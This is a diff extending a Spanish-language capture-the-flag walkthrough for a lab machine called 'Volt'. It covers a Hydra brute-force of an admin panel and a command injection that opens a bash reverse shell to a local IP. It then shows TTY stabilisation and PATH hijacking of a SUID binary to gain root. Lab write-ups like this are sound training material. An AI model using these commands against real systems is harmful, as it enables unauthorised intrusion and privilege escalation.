@@ -107,6 +107,116 @@ lo arreglamos así:
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.43 http-post-form "/admin:username=admin&password=^PASS^:1=:Invalid" -F -I 
 ```
+![VoltImage](images/volt/12.png)
+
+
+Pues ya tenemos user y pass para el panel `admin:chocolate3`
+
+## FASE INTRUSIÓN
+
+Pues vemos un panel de diagnostico del sistema, haciendo una prieba facil, consigo ejecución de comandos:
+
+
+![VoltImage](images/volt/13.png)
+
+me pongo en escucha por el puerto 4444
+
+```bash
+sudo nc -nvlp 4444
+```
+
+![VoltImage](images/volt/14.png)
+
+
+lanzo la reverseshell:
+
+```bash
+127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.1.44/4444 0>&1'
+```
+
+
+![VoltImage](images/volt/16.png)
+
+
+y ya estamos dentro:
+
+![VoltImage](images/volt/15.png)
 
 
 
+## ESCALADA DE PRIVILEGIOS
+
+Hacemos tratamiento de la TTY:
+
+```bash
+export TERM=xterm
+export SHELL=bash
+script /dev/null -c bash 
+^Z
+stty raw -echo; fg
+reset xterm
+stty rows 51 columns 237
+```
+mirando binario encuentro algo interesante:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+
+![VoltImage](images/volt/17.png)
+
+
+compruebo con file que efectivamente se trata de un binario y con ls -la que efectivamente es SUID:
+
+
+![VoltImage](images/volt/18.png)
+
+
+vamosa mirar con strings si encontramos algo en el binario o sino ya procederemos a analizarlo:
+
+```bash
+strings /usr/local/bin/procmon | grep -Ei 'system|exec|popen|sh|bash|cat|ps|proc|tmp|PATH'
+```
+
+![VoltImage](images/volt/19.png)
+
+vemos `ps -e`,  probablemente el binario haga algo como `system("ps -e");` y se me viene a la mente como no es ruta absoluta hacer un PATH Hijacking con `ps'
+
+me voy a /tmp y compruebo las rutas del PATH:
+```bash
+cd /tmp
+echo $PATH
+```
+ahora añado al PATH `/tmp` como primera ruta a mirar:
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+y compruebo el nuevo PATH
+```bash
+echo $PATH
+```
+
+
+![VoltImage](images/volt/20.png)
+
+
+Ahora solo tengo que crear un script que se llame `ps` y el binario buscará primero en `/tmp` si existe, como lo he creado va a ejecutar mi script
+
+creamos un script por ejmplo así:
+
+```bash
+echo "chmod u+s /bin/bash" > ps
+```
+
+ejecutamos el binario:
+
+```bash
+/usr/local/bin/procmon
+```
+
+hemos cambiado la `/bin/bash` y ejecutando `bash -p` somos root:
+
+![VoltImage](images/volt/21.png)
